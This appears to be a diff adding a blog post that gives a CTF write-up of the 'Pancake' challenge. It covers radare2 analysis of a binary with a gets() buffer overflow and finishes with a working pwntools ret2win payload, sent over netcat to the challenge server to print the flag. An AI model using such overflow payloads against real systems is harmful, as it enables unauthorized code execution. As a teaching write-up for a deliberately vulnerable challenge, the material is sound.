@@ -1,0 +1,116 @@
+<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta name="next-head-count" content="2"/><link rel="preload" href="/_next/static/css/612a222fb0c8327bc985.css" as="style"/><link rel="stylesheet" href="/_next/static/css/612a222fb0c8327bc985.css" data-n-g=""/><link rel="preload" href="/_next/static/css/670b2ba76521e264e24c.css" as="style"/><link rel="stylesheet" href="/_next/static/css/670b2ba76521e264e24c.css" data-n-p=""/><noscript data-n-css=""></noscript><link rel="preload" href="/_next/static/chunks/main-716454fbc5f967e07bd2.js" as="script"/><link rel="preload" href="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" as="script"/><link rel="preload" href="/_next/static/chunks/framework.cdbdac0a36200f52203c.js" as="script"/><link rel="preload" href="/_next/static/chunks/99f422a92ff7083adb8a7d840734144fa7589f68.7cc229cc9d165929cc42.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/_app-bffba6408cd4aa04210c.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/blog/pancake-3d83cf7acca91a9a1483.js" as="script"/></head><body><div id="__next"><div class="post_post__1Lsln"><h1>Pancake (HacktivityCon CTF)</h1><h6>August 1, 2020</h6><p><strong>Description</strong>
+Pancake is a simple binary exploitation challenge from HacktivityCon CTF.
+Entering a long string causes a buffer overflow and pancake segfaults. Some familiarity with radare2 and the call stack will be helpful going through this writeup. A great guide on radare2 can be found <a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/">here</a>.
+<strong>Analysis</strong>
+Load and analyze the binary in radare2. The stack is not executable, but the file isn&#x27;t protected by <a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries">canaries</a> nor compiled with support for <a href="https://en.wikipedia.org/wiki/Position-independent_code">position independent code</a>. This means that there is no protection against buffer overflows and the segments will always be loaded to the same location.</p><div class="post_codeblock__jpvW3"><pre><code>$ r2 -A pancakes
+[0x00400700]&gt; iI
+arch     x86
+baddr    0x400000
+binsz    6995
+bintype  elf
+bits     64
+canary   false
+nx       true
+pic      false
+... (output truncated)
+</code></pre></div><p>List function symbols within the binary. Although most of the functions are from C libraries and calls used by the program, two of them stand out. One of them is <code>main</code>, which is always worth checking out. The second is <code>secret_recipe</code>, which seems to be a user defined function.</p><div class="post_codeblock__jpvW3"><pre><code>[0x00400700]&gt; afl
+0x00400700    1 42           entry0
+0x00400740    4 42   -&gt; 37   sym.deregister_tm_clones
+0x00400770    4 58   -&gt; 55   sym.register_tm_clones
+0x004007b0    3 34   -&gt; 29   sym.__do_global_dtors_aux
+0x004007e0    1 7            entry.init0
+0x00400a70    1 2            sym.__libc_csu_fini
+0x00400a74    1 9            sym._fini
+0x0040098b    1 113          sym.secret_recipe
+0x004006d0    1 6            sym.imp.fopen
+0x00400690    1 6            sym.imp.fread
+0x00400680    1 6            sym.imp.puts
+0x00400a00    4 101          sym.__libc_csu_init
+0x00400730    1 2            sym._dl_relocate_static_pie
+0x004007e7   10 420          main
+0x00400648    3 23           sym._init
+0x00400670    1 6            sym.imp.putchar
+0x004006a0    1 6            sym.imp.printf
+0x004006b0    1 6            sym.imp.gets
+0x004006c0    1 6            sym.imp.setvbuf
+0x004006e0    1 6            sym.imp.atoi
+0x004006f0    1 6            sym.imp.usleep
+0x004000ea    1 2            fcn.004000ea
+</code></pre></div><p>Firstly, examine the <code>secret_recipe</code> because it&#x27;s supposed to be a secret. Going over the disassembly, the function is simple. <code>secret_recipe</code> opens a file named <code>flag.txt</code>, reads it contents and prints it out.</p><div class="post_codeblock__jpvW3"><pre><code>[0x00400700]&gt; pdf @ sym.secret_recipe
+... (output truncated, radare comments removed for better readability)
+0x004009a5       488d3dce0200.   lea rdi, str.flag.txt
+0x004009ac       e81ffdffff      call sym.imp.fopen
+0x004009b1       488945f0        mov qword [stream], rax
+0x004009b5       488b55f0        mov rdx, qword [stream]
+0x004009b9       488d8560ffff.   lea rax, [ptr]
+0x004009c0       4889d1          mov rcx, rdx
+0x004009c3       ba80000000      mov edx, 0x80
+0x004009c8       be01000000      mov esi, 1
+0x004009cd       4889c7          mov rdi, rax
+0x004009d0       e8bbfcffff      call sym.imp.fread
+0x004009f4       e887fcffff      call sym.imp.puts
+</code></pre></div><p>Next, skimming through the disassembly for <code>main</code>, the function also seems fairly straightforward - prints some stuff, gets user input and prints more stuff. <code>main</code> uses the <code>gets</code> function to get input. <code>gets</code> is a deprecated function that does not peform checks on input length, leading to potential buffer overflows exploits. This explains the segfault upon passing in a long string.</p><div class="post_codeblock__jpvW3"><pre><code>[0x00400700]&gt; pdf @ main
+... (output truncated, radare comments removed for better readability)
+0x0040085b      e860feffff     call sym.imp.setvbuf
+0x00400860      488d3d510300.  lea rdi, str.Welcome_to_the_pancake_stacker
+0x00400867      e814feffff     call sym.imp.puts
+0x0040086c      488d3d650300.  lea rdi, str.How_many_pancakes_do_you_want
+0x00400873      e808feffff     call sym.imp.puts
+0x00400878      488d8570ffff.  lea rax, [str]
+0x0040087f      4889c7         mov rdi, rax
+0x00400882      b800000000     mov eax, 0
+0x00400887      e824feffff     call sym.imp.gets
+0x0040088c      488d8570ffff.  lea rax, [str]
+0x00400893      4889c7         mov rdi, rax
+0x00400896      b800000000     mov eax, 0
+0x0040089b      e840feffff     call sym.imp.atoi
+0x004008a0      8945f0         mov dword [var_10h], eax
+0x004008a3      488d3d4d0300.  lea rdi, str.Cooking_your_cakes
+0x004008aa      b800000000     mov eax, 0
+0x004008af      e8ecfdffff     call sym.imp.printf
+... (output truncated)
+</code></pre></div><p>Note that <code>main</code> does not make a call to <code>secret_recipe</code>. Maybe the vulnerable <code>gets</code> can be exploited to overwrite the return address on the stack?
+<strong>Exploitation</strong>
+To craft the payload, we need to identify the offset in our buffer where the return address will be placed. To do so, generate a <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijn Sequence</a> long enough string to cause a segfault. The sequence can be generated by using <code>ragg2</code>, which is part of the radare project.</p><div class="post_codeblock__jpvW3"><pre><code>$ ragg2 -P 200 -r
+AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA%
+</code></pre></div><p>Run radare2 in debug mode <code>r2 -d ./pancake</code>. Analyze the binary and set a breakpoint at the <code>ret</code> instruction in <code>main</code>. This will pause execution of the program just before the <code>main</code> function exits, allowing us to examine the stack. <code>dc</code> to begin execution of the program, passing the De Bruijn Sequence when prompted. Since we have placed a breakpoint at the end of main, the program should pause execution. Print the first 16 bytes on the stack using <code>pxw 8 @ rsp</code>. Using the first four bytes on the stack, calculate the offset using the command <code>wopO 0x41417a41</code>. This is where we will place the address to <code>secret_recipe</code>.</p><div class="post_codeblock__jpvW3"><pre><code>[0x00400700]&gt; pdf @ main
+... (output truncated)
+0x00400984      b800000000     mov eax, 0
+0x00400989      c9             leave
+0x0040098a      c3             ret
+[0x00400700]&gt; db 0x0040098a
+[0x00400700]&gt; dc
+... (output truncated)
+hit breakpoint at: 40098a
+[0x0040098a]&gt; pxw 16 @ rsp
+0x7ffffe1723b8  0x41417a41 0x32414131 0x41334141 0x41413441  AzAA1AA2AA3AA4AA
+[0x0040098a]&gt; wopO 0x41417a41
+152
+</code></pre></div><p>The final payload will be just a buffer of 152 bytes with the address of <code>secret_recipe</code> added onto the end. Since data is stored and loaded in little endian format on x86, the address to <code>secret_recipe</code> must be passed with the same endianess. Pwntools can be used to easily convert the address into little endian format, instead of doing it manually, which can be tedious. Finally create a file (if it does not already exist) in the same directory named <code>file.txt</code> to test the payload.</p><div class="post_codeblock__jpvW3"><pre><code>$ cat flag.txt
+FLAG{HASH123}
+$ python -c &quot;from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b&#x27;A&#x27;*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)&quot; | ./pancakes
+...(output truncated)
+FLAG{HASH123}
+[1]    17531 done                              python -c  |
+       17532 segmentation fault (core dumped)  ./pancakes
+</code></pre></div><p>With the payload working, throw it over netcat to capture the flag.</p><div class="post_codeblock__jpvW3"><pre><code>$ {python -c &quot;from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b&#x27;A&#x27;*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)&quot;;cat;} | nc jh2i.com 50021
+Welcome to the pancake stacker!
+How many pancakes do you want?
+Cooking your cakes.....
+Smothering them in butter.....
+Drowning them in syrup.....
+They&#x27;re ready! Our waiters are bringing them out now...
+        _____________
+       /    ___      \\
+      ||    \\__\\     ||
+      ||      _      ||
+      |\\     /\ \     /|
+      \\ \\___/ ^ \\___/ /
+      \\\\____/_^_\\____//_
+    __\\\\____/_^_\\____// \\
+   /   \____/_^_\____/ \\ \\
+  //                   , /
+  \\\\___________   ____  /
+               \\_______/
+flag{too_many_pancakes_on_the_stack}
+</code></pre></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/blog/pancake","query":{},"buildId":"3LkWVrF5Wd0TevBs6KKBj","nextExport":true,"autoExport":true,"isFallback":false}</script><script nomodule="" src="/_next/static/chunks/polyfills-83732ebf2ed7f8a1b2c7.js"></script><script src="/_next/static/chunks/main-716454fbc5f967e07bd2.js" async=""></script><script src="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" async=""></script><script src="/_next/static/chunks/framework.cdbdac0a36200f52203c.js" async=""></script><script src="/_next/static/chunks/99f422a92ff7083adb8a7d840734144fa7589f68.7cc229cc9d165929cc42.js" async=""></script><script src="/_next/static/chunks/pages/_app-bffba6408cd4aa04210c.js" async=""></script><script src="/_next/static/chunks/pages/blog/pancake-3d83cf7acca91a9a1483.js" async=""></script><script src="/_next/static/3LkWVrF5Wd0TevBs6KKBj/_buildManifest.js" async=""></script><script src="/_next/static/3LkWVrF5Wd0TevBs6KKBj/_ssgManifest.js" async=""></script></body></html>
